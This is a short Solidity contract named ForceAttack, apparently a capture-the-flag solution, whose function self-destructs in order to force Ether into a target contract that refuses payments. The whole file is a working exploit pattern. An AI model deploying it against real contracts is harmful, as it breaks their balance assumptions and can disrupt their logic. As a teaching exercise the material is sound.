// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    constructor() payable {}

    function explode(address payable _to) public {
        selfdestruct(_to);
    }
}
